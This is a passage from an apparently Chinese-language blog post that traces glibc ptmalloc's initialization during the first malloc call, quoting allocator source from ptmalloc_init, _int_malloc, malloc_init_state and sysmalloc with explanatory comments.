class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">weak_variable</span> <span class="params">(*__malloc_hook)</span></span></span><br><span class="line"><span class="function">  <span class="params">(<span class="keyword">size_t</span> __size, <span class="keyword">const</span> <span class="keyword">void</span> *)</span> </span>= malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>所以在 __libc_malloc 开头的检测中，会调用 malloc_hook_ini 并返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">  = atomic_forced_read (__malloc_hook);<span class="comment">// hook = __malloc_hook = malloc_hook_ini</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">// if(hook != NULL)</span></span><br><span class="line">  <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));<span class="comment">// 调用 malloc_hook_ini，传入申请的 bytes 和返回到调用者(main 函数)的地址</span></span><br></pre></td></tr></table></figure><p>malloc_hook_ini 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">malloc_hook_ini</span> <span class="params">(<span class="keyword">size_t</span> sz, <span class="keyword">const</span> <span class="keyword">void</span> *caller)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;<span class="comment">// 将 __malloc_hook 置为空，后面再调用 malloc 就不会再进到这个函数了</span></span><br><span class="line">  ptmalloc_init ();<span class="comment">// 调用 ptmalloc_init 进行初始化</span></span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);<span class="comment">// 初始化完成后，再次调用 __libc_malloc</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ptmalloc_init 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">ptmalloc_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, never use brk.</span></span><br><span class="line"><span class="comment">     Likewise if dlopened from statically linked program.  */</span></span><br><span class="line">  Dl_info di;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">      || (_dl_addr (ptmalloc_init, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">          &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">    __morecore = __failing_morecore;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (_environ != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> **runp = _environ;</span><br><span class="line">      <span class="keyword">char</span> *envline;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (__builtin_expect ((envline = next_env_entry (&amp;runp)) != <span class="literal">NULL</span>,</span><br><span class="line">                               <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">size_t</span> len = <span class="built_in">strcspn</span> (envline, <span class="string">&quot;=&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (envline[len] != <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="comment">/* This is a &quot;MALLOC_&quot; variable at the end of the string</span></span><br><span class="line"><span class="comment">               without a &#x27;=&#x27; character.  Ignore it since otherwise we</span></span><br><span class="line"><span class="comment">               will access invalid memory below.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (len)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;CHECK_&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>)</span><br><span class="line">                s = &amp;envline[<span class="number">7</span>];</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;TOP_PAD_&quot;</span>, <span class="number">8</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_TOP_PAD, atoi (&amp;envline[<span class="number">9</span>]));</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;PERTURB_&quot;</span>, <span class="number">8</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_PERTURB, atoi (&amp;envline[<span class="number">9</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;MMAP_MAX_&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_MMAP_MAX, atoi (&amp;envline[<span class="number">10</span>]));</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;ARENA_MAX&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_ARENA_MAX, atoi (&amp;envline[<span class="number">10</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;ARENA_TEST&quot;</span>, <span class="number">10</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_ARENA_TEST, atoi (&amp;envline[<span class="number">11</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;TRIM_THRESHOLD_&quot;</span>, <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_TRIM_THRESHOLD, atoi (&amp;envline[<span class="number">16</span>]));</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;MMAP_THRESHOLD_&quot;</span>, <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_MMAP_THRESHOLD, atoi (&amp;envline[<span class="number">16</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (s &amp;&amp; s[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_mallopt (M_CHECK_ACTION, (<span class="keyword">int</span>) (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">      <span class="keyword">if</span> (check_action != <span class="number">0</span>)</span><br><span class="line">        __malloc_check_init ();</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span>) = atomic_forced_read (__malloc_initialize_hook);</span><br><span class="line">  <span class="keyword">if</span> (hook != <span class="literal">NULL</span>)</span><br><span class="line">    (*hook)();</span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__malloc_initialized 是一个用于表示初始化是否完成的变量，默认被赋值为 -1，在 ptmalloc_init 开头部分赋值为 0，初始化完成后赋值为 1，故该函数也只会在初始化过程中被调用一次。接着<strong>设置线程的 thread_arena 为 &amp;main_arena</strong>，然后通过一个 while 循环遍历所有进程的环境变量，进行内存分配策略的控制（mallopt）。最后当 __malloc_initialize_hook 不为 NULL 时，调用该函数（不过该值默认为 NULL），返回到 malloc_hook_ini，再次调用 __libc_malloc 完成剩余的初始化工作、处理用户的需求</p><p>这次 __libc_malloc 由于 __malloc_hook 已被置为 NULL，故顺序往下执行，通过 arena_get 取来当前线程的 arena，并为其上锁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;\<span class="comment">// 这里取到的就是 main_arena 旳地址</span></span></span><br><span class="line">      arena_lock (ptr, size);\<span class="comment">// 将 (struct malloc_state *)ptr-&gt;mutex 设置为 1</span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>接着将 arena 地址和所申请的字节数传递给 _int_malloc，该函数才是真正在做内存分配的地方，当找到合适的空间时，该函数会返回这段空间的用户可见首地址（chunk2mem），放在变量 victim 中</p><p>下面来跟一下 _int_malloc（函数太长，就不完整贴出来了），首先根据用户需要的 bytes 计算出 chunk 的实际大小，并判断 arena 是否为空：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> checked_request2size (bytes, nb);<span class="comment">// 计算结果放在 nb，这里是 24</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// av = NULL 说明没有可用的 arena 了，需要通过 sysmalloc 从 mmap 分配 chunk</span></span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>但这个时候 av 是等于 &amp;main_arena 的，所以接着往下，判断申请的 chunk 大小是否在 fastbin 范围内：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br></pre></td></tr></table></figure><p>此时 global_max_fast 还没有被初始化（get_max_fast 得到 0），显然不会进到 fastbin 中去寻找空闲 chunk，接着判断大小是否在 smallbin 中，24 小于 512，满足条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);<span class="comment">// 取 24 在 smallbin 中的下标，idx = 3</span></span><br><span class="line">    bin = bin_at (av, idx);<span class="comment">// 取 bin3 地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">// bin-&gt;bk = 0 != bin，满足条件，此时 victim = 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>)<span class="comment">// 说明初始化未彻底完成</span></span><br><span class="line">          malloc_consolidate (av);<span class="comment">// 调用 malloc_consolidate</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ...</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>malloc_consolidate 上来就判断 global_max_fast 是否为 0，为 0 表明初始化工作还未完成，进 else 里调用 malloc_init_state：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  malloc_init_state(av);</span><br><span class="line">  check_malloc_state(av);<span class="comment">// 非 DEBUG 版本，没有定义 check_malloc_state，这里的调用不会发生</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_init_state 主要初始化 arena 的 flags、bins、top 字段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">malloc_init_state</span> <span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)<span class="comment">// 初始化所有 bin 的 fd 和 bk 都指向自己</span></span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);<span class="comment">// av = &amp;main_arena，不会设置该标志位</span></span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST);<span class="comment">// 设置 global_max_fast 为 64</span></span><br><span class="line">  av-&gt;flags |= FASTCHUNKS_BIT;<span class="comment">// 设置标志位 FASTCHUNKS_BIT，表示 fastbin 中当前没有 fastchunk</span></span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);<span class="comment">// 设置 top chunk 为 bin1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后回到 _int_malloc，进入大循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">// unsorted bin 中没有 chunk，跳出</span></span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (nb))<span class="comment">// 不满足条件</span></span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    ++idx;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    block = idx2block (idx);</span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];<span class="comment">// 此时 av-&gt;binmap 数组为全零</span></span><br><span class="line">    bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;; )<span class="comment">// 使用 binmap 找寻满足需求的最小空闲块</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                  <span class="keyword">goto</span> use_top;<span class="comment">// 会执行到这里来，去到 use_top 标签</span></span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line">            ...</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  use_top:</span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);<span class="comment">// 此时 top chunk 的大小为 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))<span class="comment">// size 为 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">// 没有 fastchunk</span></span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">// 进到这个判断</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">void</span> *p = sysmalloc (nb, av);<span class="comment">// 通过 sysmalloc 申请空间来设置 top chunk，并获得用户需求的 chunk 地址</span></span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>sysmalloc 也很长，我们只关心核心的申请代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);<span class="comment">// old_size = 0</span></span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>     <span class="comment">// 进入 else</span></span><br><span class="line">  &#123; <span class="comment">/* Request enough space for nb + pad + overhead */</span></span><br><span class="line">    size = nb + mp_.top_pad + MINSIZE;<span class="comment">// top_pad 默认为 0x20000，size = 0x20028</span></span><br><span class="line">    <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">      size -= old_size;<span class="comment">// size -= 0</span></span><br><span class="line">    size = ALIGN_UP (size, pagesize);<span class="comment">// 内存页对齐，size = 0x21000</span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        brk = (<span class="keyword">char</span> *) (MORECORE (size));<span class="comment">// 调用 sbrk，申请 0x21000 的空间</span></span><br><span class="line">        LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);<span class="comment">// 无事发生</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>MORECORE 默认赋值为 __default_morecore，该函数通过 sbrk 来增加 brk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__default_morecore (<span class="keyword">ptrdiff_t</span> increment)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *result = (<span class="keyword">void</span> *) __sbrk (increment);</span><br><span class="line">  <span class="keyword">if</span> (result == (<span class="keyword">void</span> *) <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MORECORE 之前地址映射关系：</p><p><img src="../img/1.png" alt="before"></p><p>执行后多出了一个大小为 0x21000 的内存区域：</p><p><img src="../img/2.png" alt="after"></p><p>接着看 sysmalloc，现在已经通过 MORECORE 申请到了堆空间，需要做一些扫尾工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))<span class="comment">// brk != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">void</span> (*hook) (<span class="keyword">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">// 该 hook 默认为 NULL，不调用</span></span><br><span class="line">          (*hook)();</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)<span class="comment">// 此时 sbrk_base 为 0</span></span><br><span class="line">          mp_.sbrk_base = brk;<span class="comment">// 设置 sbrk_base 为堆起始地址</span></span><br><span class="line">        av-&gt;system_mem += size;<span class="comment">// 该 arena 拥有的 system_mem 加上 size</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="keyword">char</span> *) (MORECORE_FAILURE))<span class="comment">// brk != 